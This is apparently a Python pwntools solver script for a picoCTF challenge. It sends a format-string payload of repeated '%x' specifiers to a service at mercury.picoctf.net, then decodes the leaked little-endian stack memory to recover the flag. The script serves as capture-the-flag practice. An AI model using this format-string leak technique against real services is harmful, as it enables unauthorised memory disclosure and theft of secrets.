from pwn import *


ADDRESS = "mercury.picoctf.net"
PORT = 53437


def get_clean_flag(flag_with_trash):
    start_flag_i = flag_with_trash.index("pico")
    end_flag_i = flag_with_trash.index("}")
    return flag_with_trash[start_flag_i:end_flag_i+1]


def main():
    r = remote(ADDRESS, PORT)
    context.log_level = logging.INFO
    log.info("start to solve.")

    r.recvuntil("View my")
    r.send("1\n")
    r.recvuntil("What is your API token?\n")

    # Format string vulnerability.
    r.send(f"{'%x'*40}\n")

    # Rabish
    r.recvline()
    
    server_output = r.recvline().decode().replace("\n","")
    log.info(f"server output is: {server_output}")

    final_string = ""
    for x in [server_output[i:i+8] for i in range(4, len(server_output),8)]:
        log.debug(x)
        split_to_bytes = [x[j:j+2] for j in range(0,8,2)]
        #switch to little indian.
        bytes_in_le = split_to_bytes[::-1]
        log.debug("".join(bytes_in_le))
        for byte in bytes_in_le:
            try:
                final_string += chr(int(byte, 16))
            except ValueError:
                pass

    log.debug(f"result {final_string}")
    flag = get_clean_flag(final_string)
    log.info(f"flag is {flag}")


if __name__ == "__main__":
    main()
